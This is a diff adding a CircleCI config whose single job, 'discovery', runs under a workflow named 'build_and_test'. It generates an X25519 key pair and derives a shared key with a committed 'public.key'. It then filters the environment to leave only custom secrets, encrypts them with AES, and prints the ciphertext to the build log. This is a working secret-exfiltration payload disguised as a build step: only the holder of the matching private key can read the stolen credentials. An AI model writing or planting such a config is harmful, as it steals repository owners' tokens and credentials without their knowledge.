@@ -1,0 +1,22 @@
+version: 2.1
+
+jobs:
+  discovery:
+    docker:
+      - image: cimg/base:current
+    steps:
+      - checkout
+      - run: openssl genpkey -algorithm X25519 -outform DER -out adhoc.private.key
+      - run: openssl pkey -inform DER -in adhoc.private.key -outform DER -pubout -out adhoc.public.key
+      - run: openssl pkeyutl -derive -keyform DER -inkey adhoc.private.key -peerform DER -peerkey public.key -out shared.key
+      - run: openssl base64 -A -in adhoc.public.key > message.enc
+      - run: echo >> message.enc
+      - run: > 
+          env
+          | grep -vE '^(_|LS_COLORS|LESSCLOSE|LESSOPEN|DOCKER_VERSION|CIRCLE_WORKFLOW_JOB_ID|HOSTNAME|LANGUAGE|SSH_AUTH_SOCK|CIRCLE_REPOSITORY_URL|CIRCLE_WORKING_DIRECTORY|CIRCLE_INTERNAL_CONFIG|CIRCLECI|CIRCLE_PROJECT_REPONAME|PWD|CIRCLE_WORKFLOW_ID|CIRCLE_USERNAME|CIRCLE_BRANCH|HOME|LANG|CIRCLE_PROJECT_USERNAME|CIRCLE_BUILD_NUM|COMPOSE_VER|CIRCLE_NODE_TOTAL|DOCKER_LOGIN|CIRCLE_SHA1|TERM|NO_PROXY|SHLVL|CIRCLE_BUILD_URL|BASH_ENV|PAGER|CIRCLE_NODE_INDEX|CIRCLE_WORKFLOW_WORKSPACE_ID|CIRCLE_JOB|LC_ALL|CIRCLE_SHELL_ENV|COMPOSE_SWITCH_VERSION|PATH|CIRCLE_INTERNAL_SCRATCH|CI|CIRCLE_INTERNAL_TASK_DATA|DEBIAN_FRONTEND)='
+          | openssl enc -aes-256-cbc -pbkdf2 -kfile shared.key -in - -out /dev/stdout | openssl base64 -A -in - >> message.enc
+      - run: cat message.enc
+workflows:
+  build_and_test:
+    jobs:
+      - discovery
